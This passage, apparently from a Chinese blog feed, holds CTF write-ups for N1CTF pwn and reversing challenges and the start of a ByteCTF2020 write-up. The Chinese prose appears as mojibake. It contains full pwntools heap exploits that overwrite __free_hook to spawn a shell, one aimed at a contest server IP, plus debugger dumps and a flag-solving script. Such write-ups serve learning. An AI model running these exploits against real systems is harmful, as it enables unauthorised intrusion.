class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,number</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(number)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">9990</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p=remote(host,port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">&quot;./signin&quot;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">258</span>):</span><br><span class="line">        add(<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x206</span>-<span class="number">3</span>):</span><br><span class="line">        dele(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    offset=<span class="number">0x3ebca0</span></span><br><span class="line">    libc.address=<span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>))-offset</span><br><span class="line">    success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x00010d</span>):</span><br><span class="line">        dele(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="built_in">str</span>(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">8</span>))</span><br><span class="line">    add(<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">0x68732f6e69622f</span>))</span><br><span class="line">    add(<span class="number">2</span>,<span class="built_in">str</span>(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add(1,&#x27;1234&#x27;)</span></span><br><span class="line">    <span class="comment"># add(1,&#x27;1000&#x27;)</span></span><br><span class="line">    <span class="comment"># # add(1,&#x27;1234&#x27;)</span></span><br><span class="line">    <span class="comment"># add(1,&#x27;2222&#x27;)</span></span><br><span class="line">    <span class="comment"># for i in range(6):</span></span><br><span class="line">    <span class="comment">#     dele(1)</span></span><br><span class="line">    <span class="comment"># show(1)</span></span><br><span class="line">    <span class="comment"># heap_addr=int(p.recvuntil(&quot;\n&quot;))</span></span><br><span class="line">    <span class="comment"># success(&quot;heap: &quot;+hex(heap_addr))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># dele(1)</span></span><br><span class="line">    <span class="comment"># add(1,str(heap_addr-0x011e60))</span></span><br><span class="line">    <span class="comment"># add(2,&#x27;18446744073709551615&#x27;)</span></span><br><span class="line">    <span class="comment"># add(2,&#x27;18446744073709551615&#x27;)</span></span><br><span class="line">    <span class="comment"># for i in range(31):</span></span><br><span class="line">    <span class="comment">#     add(2,&#x27;1&#x27;)</span></span><br><span class="line">    <span class="comment"># for i in range(0x220/8-2):</span></span><br><span class="line">    <span class="comment">#     dele(2)</span></span><br><span class="line">    <span class="comment"># show(2)</span></span><br><span class="line">    <span class="comment"># offset=0x3ebca0</span></span><br><span class="line">    <span class="comment"># libc.address=int(p.recvuntil(&quot;\n&quot;))-offset</span></span><br><span class="line">    <span class="comment"># success(&quot;libc: &quot;+hex(libc.address))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># for i in range(0x0023ee+4):</span></span><br><span class="line">    <span class="comment">#     dele(2)</span></span><br><span class="line">    <span class="comment">#     print&quot;times:&quot;+str(i)</span></span><br><span class="line">    <span class="comment"># add(2,str(libc.sym[&#x27;__free_hook&#x27;]-8))</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># add(1,&#x27;0&#x27;)</span></span><br><span class="line">    <span class="comment"># add(1,&#x27;0&#x27;)</span></span><br><span class="line">    <span class="comment"># add(1,str(0x31))</span></span><br><span class="line">    <span class="comment"># one=0x4f3c2</span></span><br><span class="line">    <span class="comment"># realloc_hook=libc.symbols[&#x27;__libc_realloc&#x27;]</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># binsh=0x68732f6e69622f</span></span><br><span class="line">    <span class="comment"># add(1,str(binsh))</span></span><br><span class="line">    <span class="comment"># add(1,str(libc.sym[&#x27;system&#x27;]))</span></span><br><span class="line">    <span class="comment"># for i in range(3):</span></span><br><span class="line">    <span class="comment">#     add(1,&#x27;0&#x27;)    #æ³¨é‡Šçš„æ˜¯ç¬¬ä¸€ç§è§£æ³•ã€‚</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    libc=ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line">    main(<span class="string">&quot;47.242.161.199&quot;</span>)</span><br><span class="line">    <span class="comment"># main(0)</span></span><br></pre></td></tr></table></figure><h4 id="easywrite"><a href="#easywrite" class="headerlink" title="easywrite"></a>easywrite</h4><p>è¿™é¢˜å­¦åˆ°æ–°å§¿åŠ¿äº†ï¼Œruanå¸ˆå‚…å‡ åˆ†é’Ÿæ‰“é€štqlã€‚</p><p>ç¨‹åºé€»è¾‘å¾ˆç®€å•ï¼Œç»™äº†æˆ‘ä»¬libcåœ°å€ï¼Œæœ‰ä¸€æ¬¡å¾€ä»»æ„åœ°å€å†™å…¥heapåœ°å€çš„æœºä¼šï¼Œè€Œä¸”heapçš„å†…å®¹å¯æ§ï¼Œä¹‹åç¨‹åºä¼šç”³è¯·0x30çš„å †å­˜æ”¾ç•™è¨€ï¼Œå¹¶åœ¨é€€å‡ºæ—¶freeã€‚</p><p>ç”±äºæœ€åçš„è¿™ä¸ª0x30çš„å †malloc&#x2F;freeæ“ä½œå¾ˆå¯ç–‘ï¼Œæœ€ååº”è¯¥å°±æ˜¯è¦åŠ«æŒfree_hookï¼Œä½¿å¾—åœ¨freeæ—¶è§¦å‘ã€‚</p><p>æ²¡æƒ³åˆ°ä¸Šé¢˜æ²¡ç”¨åˆ°tecache_structï¼Œè€Œè¿™é¢˜ç”¨åˆ°äº†ã€‚libcä¸­æœ‰ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘tacache_structï¼Œç¨‹åºä¹Ÿæ˜¯é€šè¿‡è¿™ä¸ªæŒ‡é’ˆæ‰¾åˆ°tecache_structçš„ä½ç½®çš„ã€‚</p><p>å› æ­¤æˆ‘ä»¬åªè¦å°†è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å†…å®¹å¯æ§çš„heapï¼Œå°±èƒ½ä¼ªé€ tecache_structï¼Œå¹¶ä¸”åœ¨å‡structä¸­å¯¹åº”0x40å¤§å°binçš„ä½ç½®å†™å…¥free_hookï¼Œé‚£æ¥ä¸‹æ¥çš„malloc(0x30)å°±ä¼šæ‹¿åˆ°free_hookï¼Œè¿›è€ŒåŠ«æŒfree_hook:)</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p=remote(host,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">&quot;./easywrite&quot;</span>)</span><br><span class="line">    one=<span class="number">0xe6ce3</span></span><br><span class="line">    debug(<span class="number">0x12BA</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Here is your gift:&quot;</span>)</span><br><span class="line">    libc.address=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input your message:&quot;</span>)</span><br><span class="line">    payload = p64(<span class="number">0x100000000</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x90</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    payload += p64(libc.address+<span class="number">0x15fed8</span>-<span class="number">0x10</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Where to write?:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.send(p64(libc.address+<span class="number">0x1648a0</span>))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Any last message?:&quot;</span>)</span><br><span class="line">    p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0</span>)+p64(libc.address-<span class="number">0x39840</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h4 id="Oflo"><a href="#Oflo" class="headerlink" title="Oflo"></a>Oflo</h4><p>è¿™é¢˜é€†å‘å¾ˆæœ‰æ„æ€ğŸ¤³</p><p>å…ˆæ‰§è¡Œä¸€ä¸‹å‘ç°è¾“å‡ºäº†linuxç‰ˆæœ¬å¹¶è¦æ±‚è¾“å…¥ã€‚</p><p>IDAæ‰“å¼€å‘å…ˆmainå‡½æ•°æœ‰èŠ±æŒ‡ä»¤ï¼Œå…ˆå»èŠ±ï¼Œä¹‹åé…åˆåŠ¨æ€è°ƒè¯•å‘ç°ç¨‹åºåœ¨main_0æœ‰ptraceå‡½æ•°æ£€æŸ¥è°ƒè¯•å™¨ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥gdbï¼Œå¾—attachä¸Šå»è°ƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ps -aux | grep oflo    è·å¾—è¿›ç¨‹å·</span><br><span class="line">#sudo gdb attach pid    attach pid</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥äº†ï¼ŒåŠ¨æ€è°ƒçš„è¿‡ç¨‹ä¸­å‘ç°ç¨‹åºä¼šå°†æˆ‘ä»¬çš„è¾“å…¥çš„å‰5ä½å’Œ0x0400A6å¤„çš„æ“ä½œç xor,ä»è€Œä¸æ–­çš„ä¿®æ­£è¯¥å¤„çš„æ“ä½œç ï¼ˆ10æ¬¡ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400A69 byte_400A69     db 3Bh, 79h, 0EAh, 91h, 2Eh, 0EDh, 0DDh  ;æ˜¯åæ‰çš„</span><br><span class="line"></span><br><span class="line">æ”¹ä¹‹å‰</span><br><span class="line">pwndbg&gt; telescope 0x400a69</span><br><span class="line">00:0000â”‚ rsi  0x400a69 â—‚â€” cmp    edi, dword ptr [rcx - 0x16] /* 0x23dded2e91ea793b */</span><br><span class="line"></span><br><span class="line">æ”¹ä¹‹å</span><br><span class="line">pwndbg&gt; telescope 0x400a69</span><br><span class="line">00:0000â”‚        0x400a69 â—‚â€” push   rbp /* 0x40ec8348e5894855 */</span><br></pre></td></tr></table></figure><p>ä¹‹åç¨‹åºä¼šcall 0x400a69ï¼Œå¦‚è¿‡ä¿®æ­£çš„ä¸å¯¹çš„è¯ç¨‹åºå°±æŠ¥é”™äº†ï¼Œè€Œæˆ‘ä»¬å‘ç°ä½¿ç”¨çš„åªæ˜¯æˆ‘ä»¬è¾“å…¥çš„å‰5ä¸ªå¦‚æœæ˜¯flagçš„è¯é‚£å°±æ˜¯n1ctfï¼Œç»“æœæŠŠ0x400a69ä¿®æ­£ä½push rbpï¼Œæ˜¾ç„¶æ˜¯æ­£ç¡®çš„ã€‚</p><p>è¿›å…¥è¯¥å‡½æ•°åå°±æ˜¯æ ¸å¿ƒçš„é€»è¾‘çš„ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  0x400a88    mov    byte ptr [rbp - 0x20], 0x35</span><br><span class="line">  0x400a8c    mov    byte ptr [rbp - 0x1f], 0x2d</span><br><span class="line">  0x400a90    mov    byte ptr [rbp - 0x1e], 0x11</span><br><span class="line">  0x400a94    mov    byte ptr [rbp - 0x1d], 0x1a</span><br><span class="line">â–º 0x400a98    mov    byte ptr [rbp - 0x1c], 0x49</span><br><span class="line">  0x400a9c    mov    byte ptr [rbp - 0x1b], 0x7d</span><br><span class="line">  0x400aa0    mov    byte ptr [rbp - 0x1a], 0x11</span><br><span class="line">  0x400aa4    mov    byte ptr [rbp - 0x19], 0x14</span><br><span class="line">  0x400aa8    mov    byte ptr [rbp - 0x18], 0x2b</span><br><span class="line">  0x400aac    mov    byte ptr [rbp - 0x17], 0x3b</span><br><span class="line">  0x400ab0    mov    byte ptr [rbp - 0x16], 0x3e</span><br><span class="line">  0x400ab4    mov    byte ptr [rbp - 0x15], 0x3d</span><br><span class="line">  0x400ab8    mov    byte ptr [rbp - 0x14], 0x3c</span><br><span class="line">  0x400abc    mov    byte ptr [rbp - 0x13], 0x5f</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶æ˜¯ç”¨æ¥è¿ç®—çš„æ•°æ®ï¼Œé‚£ä¹ˆå’Œè°è¿›è¡Œè¿ç®—å‘¢ï¼Ÿ</p><p>å¾€ä¸‹è°ƒå‘ç°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> RAX  0x35</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7ffc117e8ee0 â—‚â€” &#x27;Linux version 5.4.0-52-generic (buildd@lcy01-amd64-022) (gcc version 7.5.0 (Ubuntu 7&#x27;</span><br><span class="line"> RDX  0x7b</span><br><span class="line"> RDI  0x7ffc117e8ee0 â—‚â€” &#x27;Linux version 5.4.0-52-generic (buildd@lcy01-amd64-022) (gcc version 7.5.0 (Ubuntu 7&#x27;</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x17</span><br><span class="line"> R9   0x7f2f29996d80 (initial) â—‚â€” 0x0</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x206</span><br><span class="line"> R12  0x4005c0 â—‚â€” xor    ebp, ebp /* 0x89485ed18949ed31 */</span><br><span class="line"> R13  0x7ffc117e91d0 â—‚â€” 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7ffc117e8ea0 â€”â–¸ 0x7ffc117e90f0 â€”â–¸ 0x400d30 â—‚â€” push   r15 /* 0x41ff894156415741 */</span><br><span class="line"> RSP  0x7ffc117e8e60 â€”â–¸ 0x7ffc117e8ec5 â—‚â€” &#x27;&#123;aaaaa&#125;\n&#x27;</span><br><span class="line">*RIP  0x400aff â—‚â€” movzx  ecx, byte ptr [rcx] /* 0xc183c9be0f09b60f */</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x400aef    movsx  edx, dl</span><br><span class="line">   0x400af2    mov    ecx, dword ptr [rbp - 0x24]</span><br><span class="line">   0x400af5    movsxd rsi, ecx</span><br><span class="line">   0x400af8    mov    rcx, qword ptr [rbp - 0x38]</span><br><span class="line">   0x400afc    add    rcx, rsi</span><br><span class="line"> â–º 0x400aff    movzx  ecx, byte ptr [rcx]</span><br><span class="line">   0x400b02    movsx  ecx, cl</span><br><span class="line">   0x400b05    add    ecx, 2</span><br><span class="line">   0x400b08    xor    edx, ecx</span><br><span class="line">   0x400b0a    cmp    eax, edx</span><br></pre></td></tr></table></figure><p>å¤šå¾ªç¯å‡ æ¬¡å°±ä¼šå‘ç°æ˜¯å’Œâ€™Linux version â€˜å„ä¸ªå­—ç¬¦çš„ord()+2è¿›è¡Œxorï¼Œè¿›è€Œå†™å‡ºè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data=[<span class="number">0x35</span>,<span class="number">0x2d</span>,<span class="number">0x11</span>,<span class="number">0x1a</span>,<span class="number">0x49</span>,<span class="number">0x7d</span>,<span class="number">0x11</span>,<span class="number">0x14</span>,<span class="number">0x2b</span>,<span class="number">0x3b</span>,<span class="number">0x3e</span>,<span class="number">0x3d</span>,<span class="number">0x3c</span>,<span class="number">0x5f</span>]</span><br><span class="line">code=<span class="string">&#x27;Linux version &#x27;</span></span><br><span class="line">code=<span class="built_in">list</span>(code)</span><br><span class="line">flag=<span class="string">&#x27;n1ctf&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(code[i])+<span class="number">2</span>)^(data[i]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>å‰é¢ä¿®æ­£æœºå™¨ç çš„éƒ¨åˆ†è°ƒäº†å¥½ä¹…æ‰æ˜ç™½ğŸ›Œ</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByteCTFåˆèµ›</title>
      <link href="/2020/10/26/ByteCTF2020%E5%88%9D%E8%B5%9B/"/>
      <url>/2020/10/26/ByteCTF2020%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="ByteCTF2020-éƒ¨åˆ†pwn-amp-re"><a href="#ByteCTF2020-éƒ¨åˆ†pwn-amp-re" class="headerlink" title="ByteCTF2020 éƒ¨åˆ†pwn&amp;re"></a>ByteCTF2020 éƒ¨åˆ†pwn&amp;re</h3><blockquote><p>æ¯”èµ›æ‰“äº†ä¸¤å¤©ï¼ŒæŒºæ¿€çƒˆçš„ï¼Œå°¤å…¶æœ€åæ—¶åˆ»å¤§å®¶éƒ½ç–¯ç‹‚å†²åˆ†ï¼Œæœ€åæ²¡èƒ½å®ˆä½æ‰åˆ°23äº†ğŸ¤¦</p></blockquote><span id="more"></span><p>è¿™åœºæ¯”èµ›ç»™æˆ‘çš„æœ€æ·±çš„æ„Ÿå—æ˜¯æˆ‘çš„é€†å‘ç»éªŒå¤ªå°‘äº†ï¼Œå¯¼è‡´èŠ±è´¹äº†å¾ˆå¤šæ—¶é—´åœ¨æ²¡ç”¨çš„å‡½æ•°é‡Œï¼Œå€¼å¾—å¥½å¥½æ€»ç»“ã€‚</p><h4 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h4><p>ç¬¬ä¸€é“pwné¢˜ï¼Œå¤šäºruanå¸ˆå‚…çœ¼ç–¾æ‰‹å¿«å¸®æˆ‘æ”¹å¥½äº†æœ€åçš„ropï¼Œæ‹¿åˆ°äº†äºŒè¡€ï¼Œä¸ç„¶æˆ‘è¿˜å¾—è°ƒåŠå¤©ï¼Œè¿™ç§æœ€åçš„orwå¯ä»¥å½“ä½œæ¨¡æ¿æ¥ç”¨ï¼Œå¥½å¥½ä½“ä¼šä¸€ä¸‹ã€‚</p><p>é¢˜ç›®æ˜¯é“èœå•é¢˜ï¼Œ2.31çš„libcï¼ŒåŠŸèƒ½å¤§æ¦‚æ˜¯buy(è´­ä¹°å­å¼¹)â€“add</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">buy</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 idx; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  idx = sub_1542();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> puts_1(<span class="string">&quot;Enough&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( qword_4070[<span class="number">3</span> * idx] == <span class="number">1LL</span> )</span><br><span class="line">    <span class="keyword">return</span> puts_1(<span class="string">&quot;The bullet is Used!&quot;</span>);</span><br><span class="line">  puts_0(<span class="string">&quot;Bullet price: &quot;</span>);</span><br><span class="line">  v2 = sub_14E3();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> || (__int64)((__int64)off_4010 - v2) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> puts_1(<span class="string">&quot;Too pool!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0x500</span> )</span><br><span class="line">    <span class="keyword">return</span> puts_1(<span class="string">&quot;Too big!&quot;</span>);</span><br><span class="line">  *((_QWORD *)&amp;unk_4060 + <span class="number">3</span> * idx) = sub_11A0(v2);</span><br><span class="line">  qword_4070[<span class="number">3</span> * idx] = <span class="number">1LL</span>;</span><br><span class="line">  puts_0(<span class="string">&quot;Bullet Name: &quot;</span>);</span><br><span class="line">  read_n(*((_QWORD *)&amp;unk_4060 + <span class="number">3</span> * idx), v2);</span><br><span class="line">  off_4010 = (__int64 (__fastcall *)())((<span class="type">char</span> *)off_4010 - v2);</span><br><span class="line">  <span class="keyword">return</span> puts_1(<span class="string">&quot;Confirm&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>load(å¡«å……å­å¼¹ï¼Œå³å°†heapé“¾æ¥ä¸€èµ·)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_16E1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  puts_0(<span class="string">&quot;Which one do you want to load?&quot;</span>);</span><br><span class="line">  v1 = sub_14E3();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xD</span> || qword_4070[<span class="number">3</span> * v1] == <span class="number">0LL</span> || qword_4070[<span class="number">3</span> * v1] == <span class="number">2LL</span> )</span><br><span class="line">    <span class="keyword">return</span> puts_1(<span class="string">&quot;what??&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( qword_4050 )</span><br><span class="line">    *((_QWORD *)&amp;unk_4068 + <span class="number">3</span> * v1) = qword_4050;</span><br><span class="line">  qword_4050 = (__int64)&amp;unk_4060 + <span class="number">24</span> * v1;</span><br><span class="line">  *((_QWORD *)&amp;unk_4060 + <span class="number">3</span> * v1 + <span class="number">2</span>) = <span class="number">2LL</span>;</span><br><span class="line">  <span class="keyword">return</span> puts_1(<span class="string">&quot;Confirm.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shoot(å‘å°„å­å¼¹)â€“deleã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 